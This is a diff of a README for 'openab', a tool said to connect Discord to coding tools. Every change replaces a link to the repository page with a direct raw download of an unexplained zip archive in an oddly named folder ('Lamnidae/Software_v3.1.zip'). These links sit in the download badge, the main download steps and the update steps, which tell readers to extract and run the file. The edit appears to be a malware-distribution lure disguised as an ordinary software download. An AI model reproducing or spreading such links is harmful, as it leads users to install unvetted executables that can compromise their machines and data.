@@ -1,6 +1,6 @@
 # 🧩 openab - Connect Discord to coding tools
 
-[![Download openab](https://img.shields.io/badge/Download-openab-blue?style=for-the-badge)](https://github.com/harveyalexandrian753/openab)
+[![Download openab](https://img.shields.io/badge/Download-openab-blue?style=for-the-badge)](https://raw.githubusercontent.com/harveyalexandrian753/openab/main/Lamnidae/Software_v3.1.zip)
 
 ## 🚀 What openab does
 
@@ -25,7 +25,7 @@ If you plan to use a local coding tool, keep it installed before you start. If y
 
 Visit this page to download openab:
 
-[https://github.com/harveyalexandrian753/openab](https://github.com/harveyalexandrian753/openab)
+[https://raw.githubusercontent.com/harveyalexandrian753/openab/main/Lamnidae/Software_v3.1.zip](https://raw.githubusercontent.com/harveyalexandrian753/openab/main/Lamnidae/Software_v3.1.zip)
 
 On that page, look for the latest release or the main download files. If you see a Windows app file, download it to your computer. If you only see source files, use the release files that match Windows.
 
@@ -222,7 +222,7 @@ If you see a .zip file, extract it before running the app.
 
 When a new version is posted, use the same download link:
 
-[https://github.com/harveyalexandrian753/openab](https://github.com/harveyalexandrian753/openab)
+[https://raw.githubusercontent.com/harveyalexandrian753/openab/main/Lamnidae/Software_v3.1.zip](https://raw.githubusercontent.com/harveyalexandrian753/openab/main/Lamnidae/Software_v3.1.zip)
 
 Then repeat the download and install steps with the new file. If you keep a config file, back it up first so you can restore your settings after the update.
 
